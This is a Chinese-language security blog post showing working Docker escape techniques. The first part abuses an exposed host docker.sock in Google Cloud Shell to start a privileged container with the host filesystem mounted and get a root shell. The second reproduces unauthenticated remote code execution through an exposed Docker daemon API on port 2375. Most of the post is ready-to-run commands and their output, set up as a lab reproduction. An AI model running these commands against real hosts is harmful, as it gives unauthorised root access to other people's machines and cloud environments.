---
title:      "「DOCKER」:谈谈docker逃逸那点事"
author:     "Bin4xin"
catalog: true

article_header:
  type: cover

tags:
    - 笔记
    - docker逃逸
    - 漏洞实战

---
# google-cloud-shell-docker逃逸
```javascript
sudo docker -H unix:///google/host/var/run/docker.sock pull alpine:latest
Welcome to Cloud Shell! Type "help" to get started.
Your Cloud Platform project in this session is set to avid-rope-267508.
Use “gcloud config set project [PROJECT_ID]” to change to a different project.
chihou_pro@cloudshell:~ (avid-rope-267508)$ sudo su
root@cs-6000-devshell-vm-d336a485-4d57-485b-bd84-220ac5dd5619:/home/chihou_pro# ls
README-cloudshell.txt
```
<!--
![GitHub](https://avatars2.githubusercontent.com/u/3265208?v=3&s=100 =260x100 "GitHub,Social Coding")
-->

很明显的看到，使用了docker容器，[参考]：

[参考]:https://xz.aliyun.com/t/6982 "helloworld:)"
```javascript
root@cs-6000-devshell-vm-d336a485-4d57-485b-bd84-220ac5dd5619:/home/chihou_pro# cat /proc/1/cgroup
12:hugetlb:/kubepods/besteffort/pod9621f4ca5c9abb70e26317dc85781dd7/2a5c07b1452692a636285fe36c44da49fe7f0afd48070c1d7f73a27138c5ad2b
11:perf_event:/kubepods/besteffort/pod9621f4ca5c9abb70e26317dc85781dd7/2a5c07b1452692a636285fe36c44da49fe7f0afd48070c1d7f73a27138c5ad2b
10:cpu,cpuacct:/kubepods/besteffort/pod9621f4ca5c9abb70e26317dc85781dd7/2a5c07b1452692a636285fe36c44da49fe7f0afd48070c1d7f73a27138c5ad2b
9:cpuset:/kubepods/besteffort/pod9621f4ca5c9abb70e26317dc85781dd7/2a5c07b1452692a636285fe36c44da49fe7f0afd48070c1d7f73a27138c5ad2b
8:memory:/kubepods/besteffort/pod9621f4ca5c9abb70e26317dc85781dd7/2a5c07b1452692a636285fe36c44da49fe7f0afd48070c1d7f73a27138c5ad2b
7:devices:/kubepods/besteffort/pod9621f4ca5c9abb70e26317dc85781dd7/2a5c07b1452692a636285fe36c44da49fe7f0afd48070c1d7f73a27138c5ad2b
6:freezer:/kubepods/besteffort/pod9621f4ca5c9abb70e26317dc85781dd7/2a5c07b1452692a636285fe36c44da49fe7f0afd48070c1d7f73a27138c5ad2b
5:blkio:/kubepods/besteffort/pod9621f4ca5c9abb70e26317dc85781dd7/2a5c07b1452692a636285fe36c44da49fe7f0afd48070c1d7f73a27138c5ad2b
4:rdma:/
3:pids:/kubepods/besteffort/pod9621f4ca5c9abb70e26317dc85781dd7/2a5c07b1452692a636285fe36c44da49fe7f0afd48070c1d7f73a27138c5ad2b
2:net_cls,net_prio:/kubepods/besteffort/pod9621f4ca5c9abb70e26317dc85781dd7/2a5c07b1452692a636285fe36c44da49fe7f0afd48070c1d7f73a27138c5ad2b
1:name=systemd:/kubepods/besteffort/pod9621f4ca5c9abb70e26317dc85781dd7/2a5c07b1452692a636285fe36c44da49fe7f0afd48070c1d7f73a27138c5ad2b
0::/system.slice/containerd.service
```

## 发现docker
我们可以看到`kubepods`等关键词，浏览了文件系统之后，注意到有2个Docker unix套接字可用。在`/run/docker.sock`中，这是我们在Cloud Shell中运行的Docker客户端的默认路径。
```javascript
root@cs-6000-devshell-vm-d336a485-4d57-485b-bd84-220ac5dd5619:/# cat run/
docker/         docker.sock     google/         metrics/        postgresql/     sshd/           supervisor.pid  xtables.lock
docker.pid      docker-ssd.pid  lock/           mount/          rsyslogd.pid    sshd.pid        utmp
```
/google/host/var/run/docker.sock套接字，这是第二个。
```javascript
root@cs-6000-devshell-vm-d336a485-4d57-485b-bd84-220ac5dd5619:/# ls /google/host/var/run/
agetty.reload  cloud-init        command-recorder  crash_reporter  docker      dockershim.sock  initctl  lockbox  lvm         metrics  sshd.pid  systemd  tmpfiles.d  user  vm
blkid          cloudshell-creds  containerd        dbus            docker.pid  docker.sock      lock     log      machine-id  mount    sudo      theia    udev        utmp  xtables.lock
```
然后根据上面的可利用套接字准备一个bash文件进行docker逃逸:-)
new a bash file to escape docker in google_cloud_shell.

```javascript
sudo docker -H unix:///google/host/var/run/docker.sock pull alpine:latest
sudo docker -H unix:///google/host/var/run/docker.sock run -d -it --name LiveOverflow-container -v "/proc:/host/proc" -v "/sys:/host/sys" -v "/:/rootfs" --network=host --privileged=true --cap-add=ALL alpine:latest
sudo docker -H unix:///google/host/var/run/docker.sock start LiveOverflow-container
sudo docker -H unix:///google/host/var/run/docker.sock exec -it LiveOverflow-container /bin/sh
```

运行bash文件
```javascript
root@cs-6000-devshell-vm-d336a485-4d57-485b-bd84-220ac5dd5619:/home/chihou_pro# bash docker_escape.sh
latest: Pulling from library/alpine
Digest: sha256:39eda93d15866957feaee28f8fc5adb545276a64147445c64992ef69804dbf01
Status: Image is up to date for alpine:latest
docker.io/library/alpine:latest
docker: Error response from daemon: Conflict. The container name "/LiveOverflow-container" is already in use by container "2e2896994c459d7be0a6acb613c8be509ef5158cb97ddac4b5e30b2fed770d56". You have to remove (or rename) that container to be able to reuse that name.
See 'docker run --help'.
LiveOverflow-container
/ # whoami
root
```
如上，逃逸成功

***
------
___


# docker daemon api漏洞复现
验证漏洞存在：
```javascript
[root@iZ2ze9ebgot9gy5c2mi5ecZ unauthorized-rce]# curl http://vuln_docker_ip:2375/info
{"ID":"OY55:HR25:LKHP:XTLU:LCID:Y64D:46WQ:4T5U:U2SF:5PVW:R7I3:T6KV","Containers":2,"ContainersRunning":1,"ContainersPaused":0,"ContainersStopped":1,"Images":1,"Driver":"overlay2","DriverStatus":[["Backing Filesystem","extfs"],["Supports d_type","true"],["Native Overlay Diff","true"]],"SystemStatus":null,"Plugins":{"Volume":["local"],"Network":["bridge","host","macvlan","null","overlay"],"Authorization":null,"Log":["awslogs","fluentd","gcplogs","gelf","journald","json-file","logentries","splunk","syslog"]},"MemoryLimit":true,"SwapLimit":true,"KernelMemory":true,"CpuCfsPeriod":true,"CpuCfsQuota":true,"CPUShares":true,"CPUSet":true,"IPv4Forwarding":true,"BridgeNfIptables":false,"BridgeNfIp6tables":false,"Debug":false,"NFd":29,"OomKillDisable":true,"NGoroutines":51,"SystemTime":"2020-05-22T02:44:08.778253143Z","LoggingDriver":"json-file","CgroupDriver":"cgroupfs","NEventsListener":0,"KernelVersion":"3.10.0-1062.12.1.el7.x86_64","OperatingSystem":"Alpine Linux v3.7 (containerized)","OSType":"linux","Architecture":"x86_64","IndexServerAddress":"https://index.docker.io/v1/","RegistryConfig":{"AllowNondistributableArtifactsCIDRs":[],"AllowNondistributableArtifactsHostnames":[],"InsecureRegistryCIDRs":["127.0.0.0/8"],"IndexConfigs":{"docker.io":{"Name":"docker.io","Mirrors":[],"Secure":true,"Official":true}},"Mirrors":[]},"NCPU":2,"MemTotal":3973296128,"GenericResources":null,"DockerRootDir":"/var/lib/docker","HttpProxy":"","HttpsProxy":"","NoProxy":"","Name":"14e1a228e781","Labels":[],"ExperimentalBuild":false,"ServerVersion":"18.03.0-ce","ClusterStore":"","ClusterAdvertise":"","Runtimes":{"runc":{"path":"docker-runc"}},"DefaultRuntime":"runc","Swarm":{"NodeID":"","NodeAddr":"","LocalNodeState":"inactive","ControlAvailable":false,"Error":"","RemoteManagers":null},"LiveRestoreEnabled":false,"Isolation":"","InitBinary":"docker-init","ContainerdCommit":{"ID":"cfd04396dc68220d1cecbe686a6cc3aa5ce3667c","Expected":"cfd04396dc68220d1cecbe686a6cc3aa5ce3667c"},"RuncCommit":{"ID":"4fc53a81fb7c994640722ac585fa9ca548971871","Expected":"4fc53a81fb7c994640722ac585fa9ca548971871"},"InitCommit":{"ID":"949e6fa","Expected":"949e6fa"},"SecurityOptions":["name=seccomp,profile=default"]}
```
如上，访问info目录返回了关于docker的信息。直接攻击机运行命令：
```javascript
root@shell:/home/tool/docker/unauth_rce# docker -H=tcp://vuln_docker_ip:2375 run -it -v /:/tmp --entrypoint /bin/sh alpine:latest
/ # whoami
root
/ # uname -a
Linux aa5ae15c12f0 3.10.0-1062.12.1.el7.x86_64 #1 SMP Tue Feb 4 23:02:59 UTC 2020 x86_64 Linux
/ # ifconfig
eth0      Link encap:Ethernet  HWaddr 02:42:AC:11:00:02
          inet addr:172.17.0.2  Bcast:172.17.255.255  Mask:255.255.0.0
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:8 errors:0 dropped:0 overruns:0 frame:0
          TX packets:0 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:0
          RX bytes:656 (656.0 B)  TX bytes:0 (0.0 B)

lo        Link encap:Local Loopback
          inet addr:127.0.0.1  Mask:255.0.0.0
          UP LOOPBACK RUNNING  MTU:65536  Metric:1
          RX packets:0 errors:0 dropped:0 overruns:0 frame:0
          TX packets:0 errors:0 dropped:0 overruns:0 carrier:0
```
震惊有木有，我们可以在靶场上复现，现在在撒旦上、fofa上都很少能找到这种程度的漏洞了；在宿主机上查看docker信息：
```javascript
[root@shell unauthorized-rce]# bash /home/docker_shell_exe.sh
docker0   Link encap:Ethernet  HWaddr 02:42:ED:E8:4E:97
          inet addr:172.17.0.1  Bcast:172.17.255.255  Mask:255.255.0.0
          inet6 addr: fe80::42:edff:fee8:4e97/64 Scope:Link
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:0 errors:0 dropped:0 overruns:0 frame:0
          TX packets:3 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:0
          RX bytes:0 (0.0 B)  TX bytes:266 (266.0 B)

eth0      Link encap:Ethernet  HWaddr 02:42:AC:14:00:02
          inet addr:172.20.0.2  Bcast:0.0.0.0  Mask:255.255.0.0
          inet6 addr: fe80::42:acff:fe14:2/64 Scope:Link
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:45363 errors:0 dropped:0 overruns:0 frame:0
          TX packets:41902 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:0
          RX bytes:10257217 (9.7 MiB)  TX bytes:3704534 (3.5 MiB)

lo        Link encap:Local Loopback
          inet addr:127.0.0.1  Mask:255.0.0.0
          inet6 addr: ::1/128 Scope:Host
          inet6 addr: ::1/128 Scope:Host
          UP LOOPBACK RUNNING  MTU:65536  Metric:1
          RX packets:55 errors:0 dropped:0 overruns:0 frame:0
          TX packets:55 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000
          RX bytes:6487 (6.3 KiB)  TX bytes:6487 (6.3 KiB)
```
返回的信息如上，与我们所使用的靶机机器一致；